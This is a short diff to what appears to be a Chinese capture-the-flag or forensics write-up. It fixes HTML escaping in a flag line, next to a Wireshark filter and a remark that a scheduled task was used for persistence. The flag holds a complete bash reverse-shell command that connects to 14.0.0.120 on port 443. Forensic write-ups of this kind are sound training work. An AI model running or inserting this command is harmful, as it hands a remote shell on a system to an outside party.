@@ -49,7 +49,7 @@
 `tcp contains &#34;/bin&#34;`  
 ![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406041955338.png)
 可以看到是定时任务进行了权限维持  
-`flag{/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/14.0.0.120/443 0&gt;&amp;1&#39;}`  
+`flag{/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'}`  
 
 ---
 
